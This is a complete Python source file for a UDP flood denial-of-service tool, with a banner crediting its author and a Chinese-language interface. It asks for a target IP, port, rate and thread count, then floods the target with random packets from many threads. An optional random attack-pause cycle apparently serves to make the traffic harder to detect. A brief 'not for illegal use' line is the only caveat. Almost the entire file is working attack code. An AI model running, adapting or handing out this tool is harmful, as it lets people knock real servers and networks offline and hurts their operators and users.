import os
import time
import socket
import random
import threading
from datetime import datetime
from typing import Tuple

class DDoSAttack:
    """UDP Flood DDoS Attack Implementation with random attack-pause cycles"""
    
    def __init__(self):
        """Initialize the DDoS attack tool"""
        self.sent_packets = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
        
        # 攻击-暂停周期控制
        self.cycle_control = threading.Event()
        self.cycle_control.set()  # 初始状态为攻击模式
        
        # 随机周期配置
        self.min_attack_time = 5   # 最小攻击时间(秒)
        self.max_attack_time = 20  # 最大攻击时间(秒)
        self.min_pause_time = 1    # 最小暂停时间(秒)
        self.max_pause_time = 5    # 最大暂停时间(秒)
        self.use_random_cycle = False  # 是否使用随机攻击-暂停周期
    
    def display_info(self) -> None:
        """Display program information and warning"""
        os.system("clear" if os.name == "posix" else "cls")
        
        try:
            os.system("figlet DDos Attack")
        except:
            print("=" * 50)
            print("             DDos Attack Tool             ")
            print("=" * 50)
            
        print("\n/---------------------------------------------------\\")
        print("|   作者          : Andysun06                       |")
        print("|   作者github    : https://github.com/Andysun06    |")
        print("|   kali-QQ学习群 : 909533854                       |")
        print("|   版本          : V1.3.0                          |")
        print("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
        print("\\---------------------------------------------------/")
        print("\n -----------------[请勿用于违法用途]----------------- \n")
    
    def get_user_input(self) -> Tuple[str, int, int, int, bool, Tuple[int, int, int, int]]:
        """Get target IP, port, attack speed, thread count and cycle parameters from user"""
        ip = input("请输入 IP     : ")
        
        while True:
            try:
                port = int(input("攻击端口      : "))
                if 1 <= port <= 65535:
                    break
                else:
                    print("请输入1到65535之间的有效端口")
            except ValueError:
                print("请输入一个有效的数字")
        
        while True:
            try:
                speed = int(input("攻击速度(1~1000) : "))
                if 1 <= speed <= 1000:
                    break
                else:
                    print("请输入1到1000之间的数值")
            except ValueError:
                print("请输入一个有效的数字")
        
        while True:
            try:
                threads = int(input("线程数(1~100)  : "))
                if 1 <= threads <= 100:
                    break
                else:
                    print("请输入1到100之间的数值")
            except ValueError:
                print("请输入一个有效的数字")
        
        use_random_cycle = input("是否使用随机攻击-暂停周期? (y/n): ").lower() == 'y'
        
        cycle_params = (5, 20, 1, 5)  # 默认值
        
        if use_random_cycle:
            print("\n--- 随机攻击-暂停周期配置 ---")
            try:
                min_attack = int(input("最小攻击时间(秒, 默认5): ") or "5")
                max_attack = int(input("最大攻击时间(秒, 默认20): ") or "20")
                min_pause = int(input("最小暂停时间(秒, 默认1): ") or "1")
                max_pause = int(input("最大暂停时间(秒, 默认5): ") or "5")
                
                # 验证输入
                min_attack = max(1, min_attack)
                max_attack = max(min_attack, max_attack)
                min_pause = max(1, min_pause)
                max_pause = max(min_pause, max_pause)
                
                cycle_params = (min_attack, max_attack, min_pause, max_pause)
            except ValueError:
                print("输入无效，使用默认值")
                
        return ip, port, speed, threads, use_random_cycle, cycle_params
    
    def create_socket(self) -> Tuple[socket.socket, bytes]:
        """Create UDP socket and generate random data"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 增加缓冲区大小以提高性能
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
        # 生成随机数据
        bytes_data = random._urandom(1490)
        return sock, bytes_data
    
    def print_stats(self) -> None:
        """Print attack statistics periodically"""
        while self.running:
            time.sleep(1)
            current_packets = 0
            
            with self.lock:
                current_packets = self.sent_packets
                self.sent_packets = 0
            
            elapsed = time.time() - self.start_time
            if elapsed >= 1:
                status = "攻击中" if self.cycle_control.is_set() else "暂停中"
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {status} - 已发送 {current_packets} 个数据包/秒")
    
    def cycle_manager(self) -> None:
        """Manage random attack-pause cycles"""
        while self.running:
            if self.use_random_cycle:
                # 攻击阶段
                attack_time = random.randint(self.min_attack_time, self.max_attack_time)
                self.cycle_control.set()  # 允许攻击
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 开始攻击 {attack_time} 秒...")
                time.sleep(attack_time)
                
                if not self.running:
                    break
                
                # 暂停阶段
                pause_time = random.randint(self.min_pause_time, self.max_pause_time)
                self.cycle_control.clear()  # 暂停攻击
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 暂停攻击 {pause_time} 秒...")
                time.sleep(pause_time)
            else:
                # 非随机周期模式下，一直攻击
                self.cycle_control.set()
                time.sleep(1)
    
    def attack_thread(self, sock: socket.socket, bytes_data: bytes, 
                     ip: str, port: int, speed: int) -> None:
        """Thread function to send packets with cycle control"""
        # 基础延迟时间 (由速度参数决定)
        sleep_time = (1000 - speed) / 2000
        
        try:
            while self.running:
                # 等待攻击周期开始
                if not self.cycle_control.is_set():
                    time.sleep(0.1)  # 短暂休眠，减少 CPU 使用
                    continue
                
                # 发送数据包
                sock.sendto(bytes_data, (ip, port))
                
                with self.lock:
                    self.sent_packets += 1
                
                # 应用延迟
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
        except Exception as e:
            print(f"线程错误: {e}")
    
    def send_packets(self, ip: str, port: int, speed: int, num_threads: int, 
                    use_random_cycle: bool, cycle_params: Tuple[int, int, int, int]) -> None:
        """Start multiple threads to send packets"""
        sock, bytes_data = self.create_socket()
        self.running = True
        self.start_time = time.time()
        self.use_random_cycle = use_random_cycle
        
        # 设置周期参数
        self.min_attack_time, self.max_attack_time, self.min_pause_time, self.max_pause_time = cycle_params
        
        # 创建并启动统计线程
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # 创建并启动周期管理线程
        cycle_thread = threading.Thread(target=self.cycle_manager)
        cycle_thread.daemon = True
        cycle_thread.start()
        
        # 创建并启动攻击线程
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(
                target=self.attack_thread,
                args=(sock, bytes_data, ip, port, speed)
            )
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # 显示攻击信息
        print(f"\n攻击已启动! 使用 {num_threads} 个线程攻击 {ip}:{port}")
        
        if use_random_cycle:
            print(f"随机攻击-暂停周期: 攻击 {self.min_attack_time}-{self.max_attack_time} 秒, " 
                  f"暂停 {self.min_pause_time}-{self.max_pause_time} 秒")
        else:
            print("连续攻击模式")
            
        print("按 Ctrl+C 停止攻击\n")
        
        try:
            # 保持主线程运行
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print("\n攻击已停止")
            
        # 等待线程结束
        for thread in threads:
            thread.join(timeout=1.0)
    
    def run(self) -> None:
        """Main entry point for the program"""
        self.display_info()
        
        # 从用户输入获取参数
        ip, port, speed, threads, use_random_cycle, cycle_params = self.get_user_input()
        
        # 启动攻击
        self.send_packets(ip, port, speed, threads, use_random_cycle, cycle_params)

if __name__ == "__main__":
    attack = DDoSAttack()
    attack.run()